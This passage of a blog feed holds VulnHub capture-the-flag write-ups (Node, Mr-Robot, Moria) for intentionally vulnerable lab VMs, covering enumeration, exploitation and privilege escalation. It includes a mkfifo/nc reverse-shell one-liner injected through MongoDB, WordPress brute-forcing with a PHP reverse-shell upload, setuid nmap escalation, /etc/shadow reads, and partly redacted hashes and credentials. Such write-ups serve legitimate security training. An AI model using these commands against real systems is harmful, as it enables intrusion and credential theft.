  mark:5AYRft73VtFpc84k
ssh mark@192.168.92.189
</code></pre>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_node1/screenshot09.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_node1/screenshot10.png.webp" />  </p>
<p>3. We find that the there is a <code>user.txt</code> file within <code>/home/tom/</code> directory and as user <code>mark</code> we don't have access to that file. We need to switch to user <code>tom</code> to proceed further:  </p>
<pre><code>ls /home/*
cat /home/tom/user.txt
</code></pre>
<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_node1/screenshot11.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.3.2" src="/static/files/posts_vulnhub_node1/screenshot12.png.webp" />  </p>
<p>4. We find that we can run arbitrary commands from within the MongoDB instance using its <code>scheduler</code> record for which we already found credentials via <code>app.js</code> file from the backup archive. Since the MongoDB instance is running as user <code>tom</code>, we spawn a Bash reverse shell to switch users:  </p>
<pre><code>nc -nlvp 443
mongo -p -u mark scheduler
  db.tasks.insert({&quot;cmd&quot;: &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.92.179 443 &gt;/tmp/f&quot;})
  bye
cat /home/tom/user.txt
</code></pre>
<p><img alt="writeup.exploitation.steps.4.1" src="/static/files/posts_vulnhub_node1/screenshot13.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.4.2" src="/static/files/posts_vulnhub_node1/screenshot14.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.4.3" src="/static/files/posts_vulnhub_node1/screenshot15.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.4.4" src="/static/files/posts_vulnhub_node1/screenshot16.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>mark@node&gt; id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
mark@node&gt;  
mark@node&gt; uname
Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
mark@node&gt;  
mark@node&gt; ifconfig
ens33 Link encap:Ethernet  HWaddr 00:0c:29:fe:c0:b6
      inet addr:192.168.92.189  Bcast:192.168.92.255  Mask:255.255.255.0
      inet6 addr: fe80::20c:29ff:fefe:c0b6/64 Scope:Link
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:170069 errors:0 dropped:0 overruns:0 frame:0
      TX packets:40914 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000
      RX bytes:20195705 (20.1 MB)  TX bytes:56570710 (56.5 MB)
mark@node&gt;  
mark@node&gt; users
root
tom
mark
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. We find an interesting <code>setuid</code> file <code>/usr/local/bin/backup</code>. This file is also referenced within the <code>app.js</code> file and we get a hint at how to execute it. We need a backup key which is also conviniently present in the <code>app.js</code> file. Alongwith this, we need to pass a filepath to backup as the third argument. We try to backup the <code>/root</code> directory but get a troll face instead. We then symlink the dircetory and successfully obtain the backup:  </p>
<pre><code>find / -type f -perm -04000 2&gt;/dev/null
/usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root
/usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /tmp/test/
</code></pre>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_node1/screenshot17.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_node1/screenshot18.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.3" src="/static/files/posts_vulnhub_node1/screenshot19.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.4" src="/static/files/posts_vulnhub_node1/screenshot20.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.5" src="/static/files/posts_vulnhub_node1/screenshot21.png.webp" />  </p>
<p>2. Upon following the usual steps and extracting the contents of the password encrypted zip archive, we get access to the <code>/root</code> directory and obtain the <code>root.txt</code> file to complete the challenge:  </p>
<pre><code>b64d $(cat backup-root) &gt;backup-root.zip
unzip -o -P &quot;magicword&quot; backup-root.zip
cat tmp/test/root/root.txt

</code></pre>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_node1/screenshot22.png.webp" />  </p>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>root:$6$n.BA4A59$WeIF0ZbaB3VGgAxUZqGHnw01.GhL9oVYYFioh07RpPtBl49YdMahhtbYhxUjanXf/NJXiCHBvrNhdC53P........................
tom:$6$ptD/.gN.$n.B/5dODEQFteBwg75Ip9leeaaXSMesGbfZzoVHpZihMHfbWu45UpVZTc6razK1JLZ6817ckZhAJF776Dg.......................
mark:$6$J3gYK/cQ$au1WmOCtq.X1DTKt1CEmKA9qr4PfwZuAGUdCfAV.SSU5VxAtjW/Xk1/oWJtQVaoXMEVXmeBIB6bq24Jpc........................
</code></pre>
<h3>Credentials</h3>
<pre><code>ssh: mark/5AYRft73VtFp....
webapp: myP14ceAdm1nAcc0uNT/manc......, tom/sponge..., mark/snowfl...
</code></pre>
<h3>Flags</h3>
<pre><code>user.txt: e1156acc3574e04b06908ecf........
root.txt: 1722e99ca5f353b362556a62........
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/node-1,252/">https://www.vulnhub.com/entry/node-1,252/</a>  </li>
<li><a href="https://hkh4cks.com/blog/2018/06/15/htb-node-walkthrough/">https://hkh4cks.com/blog/2018/06/15/htb-node-walkthrough/</a>  </li>
</ul>]]></description>
      <category>vulnhub</category><category>writeup</category>    </item>
        <item>
      <title>[VulnHub] Mr-Robot: 1</title>
      <link>https://7h3ram.github.io/posts/20191021_vulnhub-mrrobot1.html</link>
      <guid>https://7h3ram.github.io/posts/20191021_vulnhub-mrrobot1.html</guid>
      <pubDate>Mon, 21 Oct 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">Mr-Robot: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_mrrobot1/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_mrrobot1/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>80/tcp/http/Apache httpd</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_reverseshell">exploit_php_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>, <a href="https://github.com/7h3rAm/writeups#privesc_nmap">privesc_nmap</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Thu Oct 17 15:46:57 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/xml/_quick_tcp_nmap.xml 192.168.92.134
Nmap scan report for 192.168.92.134
Host is up, received arp-response (0.00077s latency).
Scanned at 2019-10-17 15:46:58 PDT for 22s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 64
80/tcp  open   http     syn-ack ttl 64 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http syn-ack ttl 64 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----
MAC Address: 00:0C:29:C0:00:97 (VMware)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 17 15:47:20 2019 -- 1 IP address (1 host up) scanned in 23.94 seconds
</code></pre>
<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_mrrobot1/openports.png.webp" />  </p>
<p>3. We find 2 interesting entries within the <code>http://192.168.92.134/robots.txt</code> file. One of these is for the first of the 3 key files and the other entry points to what looks like a dictionary file:  </p>
<pre><code>http://192.168.92.134/robots.txt
  http://192.168.92.134/fsocity.dic
  http://192.168.92.134/key-1-of-3.txt
</code></pre>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot01.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot01a.png.webp" />  </p>
<p>4. We download the dictionary file and trim its contents to have only unique entries. This reduced the count of possible passwords from <code>858160</code> to <code>11451</code>:  </p>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot02.png.webp" />  </p>
<p>5. From the <code>gobuster</code> scan, we also find entries pointing to a Wordpress installation. We confirm this by visiting the login page:  </p>
<pre><code>http://192.168.92.134/wp-login
</code></pre>
<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot03.png.webp" />  </p>
<p>6. After trying a few credentials manually, we decide to bruteforce usernames first. We first need to create a usernames list from the <code>fsocity.dic</code> dictionary found earlier. For our case, we will filter on strings that are 4-8 chars long. Doing this, we eventually find 5247 possible candidates. We then bruteforce these strings and find a valid username:  </p>
<pre><code>grep -E '^[a-zA-Z]' fsocity.dic | sort -u |  awk 'length($1) &lt;=8 &amp;&amp; length($1) &gt;= 4 { print $1}' &gt; users
wpuser http://192.168.92.134/ users
  Found valid username: elliot
  Found valid username: Elliot
  Found valid username: ELLIOT
</code></pre>
<p><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot04.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.6.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot04a.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>80/tcp   |  http      |  Apache httpd
443/tcp  |  ssl/http  |  Apache httpd
</code></pre>
<h4>Files</h4>
<pre><code>http://192.168.92.134/robots.txt
http://192.168.92.134/key-1-of-3.txt
</code></pre>
<h4>Users</h4>
<pre><code>wordpress: elliot
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We confirm that the username is indeed valid from Wordpress error message for incorrect password. We then use <code>wpscan</code> to bruteforce password for user <code>elliot</code> using the trimmed dictionary file and find a match:  </p>
<pre><code>wpscan --url http://192.168.92.134 -P fsocity.dic.trimmed -U elliot
  [i] Valid Combinations Found:
   | Username: elliot, Password: ER28-0652
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot05.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot06.png.webp" />  </p>
<p>2. We now authenticate as user <code>elliot</code> to the Wordpress installation and find that this user has administrative privileges. We can use these privileges to successfully upload a PHP reverse shell by modifying the <code>404.php</code> template and gain interactive access on the target system:  </p>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot07.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot07a.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot07b.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.4" src="/static/files/posts_vulnhub_mrrobot1/screenshot07c.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.5" src="/static/files/posts_vulnhub_mrrobot1/screenshot07d.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>robot@linux&gt; id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux&gt;  
robot@linux&gt; uname
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
robot@linux&gt;  
robot@linux&gt; ifconfig
eth0  Link encap:Ethernet  HWaddr 00:0c:29:c0:00:97
      inet addr:192.168.92.134  Bcast:192.168.92.255  Mask:255.255.255.0
      inet6 addr: fe80::20c:29ff:fec0:97/64 Scope:Link
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:1167588 errors:175 dropped:102 overruns:0 frame:0
      TX packets:1066054 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000
      RX bytes:928655350 (928.6 MB)  TX bytes:849863574 (849.8 MB)
      Interrupt:18 Base address:0x2000
robot@linux&gt;  
robot@linux&gt; users
root
bitnamiftp
mysql
robot
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. While looking at the <code>/home/</code> directory we find that there is a directory for user <code>robot</code> and this user has access to the second key file <code>key-2-of-3.txt</code>. We have to switch user to access this key file and to do that we need user <code>robot</code>'s password. We also find a word-readable <code>password.raw-md5</code> file within this directory and use Google to find that it is the MD5 hash of the string <code>abcdefghijklmnopqrstuvwxyz</code>. We can now proceed and switch user:  </p>
<pre><code>cat /home/robot/password.raw-md5
  robot:c3fcd3d76192e4007dfb496cca67e13b
su - robot
cat /home/robot/key-2-of-3.txt
</code></pre>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot08.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot08a.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot08b.png.webp" />  </p>
<p>2. We find that the <code>nmap</code> binary on this system has <code>setuid</code> privileges. We can use this to gain elevated access:  </p>
<pre><code>find / -type f -perm -04000 2&gt;/dev/null
ls -la /usr/local/bin/nmap
nmap --interactive
  !cat /etc/shadow
  !sh
</code></pre>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot09.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot09a.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot09b.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.4" src="/static/files/posts_vulnhub_mrrobot1/screenshot09c.png.webp" />  </p>
<p>3. We can now read the <code>/root/key-3-of-3.txt</code> file to complete the challenge:  </p>
<pre><code>cat /root/key-3-of-3.txt
</code></pre>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot10.png.webp" />  </p>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5Izn........................
bitnamiftp:$6$saPiFTAH$7K09sg5oIfkIs5kuMx1R/Um4HNd8O6vF2n8oICEom8VVer0BYATY5wtzdPdP3JeuKbZ4RYBml0THNQv8.........................
robot:$6$HmQCDKcM$mcINMrQFa0Qm7XaUaS5xLEBSeP3bUkr18iwgwTAL8AIfUDYBWG5L8J9.Ukb3gVWUQoYam4G0m.I5qaHBn........................
</code></pre>
<h3>Credentials</h3>
<pre><code>ssh: robot/abcdefghijklmnopqrs.......
wordpress: elliot/ER28-....
</code></pre>
<h3>Flags</h3>
<pre><code>http://192.168.92.134/key-1-of-3.txt: 073403c8a58a1f80d9..............
/home/robot/key-2-of-3.txt: 822c73956184f694993b............
/root/key-3-of-3.txt: 04787ddef27c3dee1ee16...........
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">https://www.vulnhub.com/entry/mr-robot-1,151/</a>  </li>
<li><a href="http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/">http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/</a>  </li>
</ul>]]></description>
      <category>vulnhub</category><category>writeup</category>    </item>
        <item>
      <title>[VulnHub] Moria: 1.1</title>
      <link>https://7h3ram.github.io/posts/20191017_vulnhub-moria11.html</link>
      <guid>https://7h3ram.github.io/posts/20191017_vulnhub-moria11.html</guid>
      <pubDate>Thu, 17 Oct 2019 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/moria-1,187/">Moria: 1.1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_moria11/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_moria11/killchain.png.webp" /></p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.70 scan initiated Fri Oct 11 15:31:50 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.moria11/results/192.168.92.188/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.moria11/results/192.168.92.188/scans/xml/_quick_tcp_nmap.xml 192.168.92.188
Nmap scan report for 192.168.92.188
Host is up, received arp-response (0.0019s latency).
Scanned at 2019-10-11 15:32:02 PDT for 15s
Not shown: 997 closed ports
Reason: 997 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey:
|   2048 47:b5:ed:e3:f9:ad:96:88:c0:f2:83:23:7f:a3:d3:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5gdKNO3UCeDGX36RIZSkcVHvWknoFBZe2IT96Gep79sECS7G2pO76RFdOCJMru0Ek9EQKhMhHTrVI0DWDJFp2apdEPVsqn8nuJKUCHbaL49frQtFnR64b5WoM+f7VgEN84S+iPmUCwwgIMjR5hoYCAJFdJNpE27ZguVbnnN+i1491TDIO/cN92Uut/T70C3bntlsptY9N+fR0hOdkLg+K+TT1zX2BZOw99OMn9ytt3kSi4DNaoDpn9GDOfXhqeQH/eJWmFNTsFSM2+GHOAZKc0Ichiqhxf3WHoGOnliH8XdV6ZNpjHA8jGCYVcPnkTk42nP7E9Ql7mabsi+L3Ugq3
|   256 85:cd:a2:d8:bb:85:f6:0f:4e:ae:8c:aa:73:52:ec:63 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCuLX/CWxsOhekXJRxQqQH/Yx0SD+XgUpmlmWN1Y8cvmCYJslOh4vE+I6fmMwCdBfi4W061RmFc+vMALlQUYNz0=
|   256 b1:77:7e:08:b3:a0:84:f8:f4:5d:f9:8e:d5:85:b9:34 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILxa4UjJJ2naeaBginolO5UHAS/rB0Wh5mtDLQuNUYaN
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Gates of Moria
MAC Address: 00:0C:29:84:7D:D1 (VMware)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 11 15:32:18 2019 -- 1 IP address (1 host up) scanned in 28.21 seconds
</code></pre>
<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_moria11/openports.png.webp" />  </p>
<p>3. We find a possible username from FTP banner:  </p>
<pre><code>PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
|_banner: 220 Welcome Balrog!
</code></pre>
<p>4. We find a few interesting directories from <code>gobuster</code> scan. Exploring the <code>http://192.168.92.188:80/w</code> link, we follow it till the <code>http://192.168.92.188/w/h/i/s/p/e/r/the_abyss/</code> link which shows some random text:  </p>
<pre><code>http://192.168.92.188:80/cgi-bin/ (Status: 403) [Size: 210]
http://192.168.92.188:80/cgi-bin/.html (Status: 403) [Size: 215]
http://192.168.92.188:80/index.php (Status: 200) [Size: 85]
http://192.168.92.188:80/index.php (Status: 200) [Size: 85]
http://192.168.92.188:80/w (Status: 301)
http://192.168.92.188/w/h/i/s/p/e/r/the_abyss/
</code></pre>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_moria11/screenshot01.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_vulnhub_moria11/screenshot02.png.webp" />  </p>
<p>5. This link shows text that seems to be hinting towards port knocking, but we don't know the ports to knock on. Upon further exploration, it seems one of the text also hints towards <code>listening</code> or sniffing that could prove useful:  </p>
<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_moria11/screenshot03.png.webp" />  </p>
<p>6. We run <code>wireshark</code> with a display filter <code>ip.addr == 192.168.92.188</code> to limit noise. In some time we see a bunch of <code>SYN</code> packets being sent to us from the target system. These packets are sent to following ports: <code>77, 101, 108, 108, 111, 110</code>  </p>
<p><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_vulnhub_moria11/screenshot04.png.webp" />  </p>
<p>7. We try to knock these ports on the target system but nothing changed. Upon further exploration, it is found that the sequence actually is the ASCII values for a string <code>Mellon</code> that could be the password for the only known username we have as of now: <code>Balrog</code>  </p>
<pre><code>nmap -Pn --host-timeout 100 --max-retries 0 -sS -p 77, 101, 108, 108, 111, 110
python -c 'print &quot;&quot;.join([chr(x) for x in [77, 101, 108, 108, 111, 110]])'
  Mellon
</code></pre>
<p><img alt="writeup.enumeration.steps.7.1" src="/static/files/posts_vulnhub_moria11/screenshot05.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.7.2" src="/static/files/posts_vulnhub_moria11/screenshot06.png.webp" />  </p>
<p>8. We tried to connect to FTP service with the <code>Balrog/Mellon</code> credentials but for some reason it didn't work:  </p>
<pre><code>ftp 192.168.92.188
  Balrog
  Mellon
</code></pre>
<p><img alt="writeup.enumeration.steps.8.1" src="/static/files/posts_vulnhub_moria11/screenshot07.png.webp" />  </p>
<p>9. From public writeups we find that the FTP user has access to the web root directory and this directory has an interesting file: <code>http://192.168.92.188/QlVraKW4fbIkXau9zkAPNGzviT3UKntl</code>  </p>
<p><img alt="writeup.enumeration.steps.9.1" src="/static/files/posts_vulnhub_moria11/screenshot08.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.9.2" src="/static/files/posts_vulnhub_moria11/screenshot09.png.webp" />  </p>
<p>10. This file lists several usernames and what looks like password hashes. The page source also reveals the password salts and hash format as <code>MD5(MD5(Password).Salt)</code>. We find a good <a href="https://github.com/piyushcse29/john-the-ripper/blob/master/doc/DYNAMIC">reference</a> for <code>john</code>'s dynamic hash variants. We create a <code>hashes</code> file by adding usernames, hashes and salts to it. We can now use <code>john</code> to crack these hashes:  </p>
<pre><code>john --format=dynamic_6 hashes
</code></pre>
<p><img alt="writeup.enumeration.steps.10.1" src="/static/files/posts_vulnhub_moria11/screenshot10.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>21/tcp  |  ftp   |  vsftpd 2.0.8 or later
22/tcp  |  ssh   |  OpenSSH 6.6.1 (protocol 2.0)
80/tcp  |  http  |  Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
</code></pre>
<h4>Files</h4>
<pre><code>http://192.168.92.188/QlVraKW4fbIkXau9zkAPNGzviT3UKntl
</code></pre>
<h4>Users</h4>
<pre><code>ftp: Balrog
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We are able to successfully crack hashes for all users from this list and can now use <code>hydra</code> to check which username/password combo actually works. We find that the <code>Ori/spanky</code> credentials allow us SSH access to the target system:  </p>
<pre><code>hydra -C creds 192.168.92.188 -t 4 ssh
ssh Ori@192.168.92.188
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_moria11/screenshot11.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_moria11/screenshot12.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>Ori@Moria&gt; id
uid=1002(Ori) gid=1003(notBalrog) groups=1003(notBalrog)
Ori@Moria&gt;  
Ori@Moria&gt; uname
Linux Moria 3.10.0-514.el7.x86_64 #1 SMP Tue Nov 22 16:42:41 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
Ori@Moria&gt;  
Ori@Moria&gt; ifconfig
ens33:  flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.92.188  netmask 255.255.255.0  broadcast 192.168.92.255
        inet6 fe80::deef:db78:6f77:ebdf  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 00:0c:29:84:7d:d1  txqueuelen 1000  (Ethernet)
        RX packets 125  bytes 13540 (13.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 87  bytes 11999 (11.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
Ori@Moria&gt;  
Ori@Moria&gt; users
abatchy
Balrog
Ori
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. We find that the user <code>Ori</code> has an entry for <code>localhost</code> within the <code>.ssh/known_hosts</code> file. This means, if local SSH configuration allows <code>root</code> user login and user <code>Ori</code>'s public key is in the <code>authorized_keys</code> of <code>root</code> user, we can SSH as <code>root</code> to localhost using <code>Ori</code>'s public key:  </p>
<pre><code>ssh -i id_rsa root@192.168.92.188
</code></pre>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_moria11/screenshot13.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_moria11/screenshot14.png.webp" />  </p>
<p>2. We gain elevated access using the above technqiue and can now view the flag to complete the challenge:  </p>
<pre><code>cat /root/flag.txt
</code></pre>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_moria11/screenshot15.png.webp" />  </p>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>root:$6$P7ElNgGp$fNzyy4OgqSR1ANJXTgbpzp4U42JXG1qJ55iNV10NVJoX5UWjtckWD0oHmcTOj0lqObyWhFu2y3udHVpHa........................
abatchy:$6$xEq/159Q$ScuKnynbwTBdFA4B9w6OqKxQpWPGpofi59McVuP6T1SADKhNy4n33Ovkk0hwZQkx72XriPSIrc2ubr16O........................
Balrog:$6$J6kuCfxq$L5ALsHRYfOu0bVV9MbW3.VZOUVEaKSWhfPIq5wXUFV407tpvH8Zx7WdbJeXgdWoPo9LU8eIznf0d44qoF........................
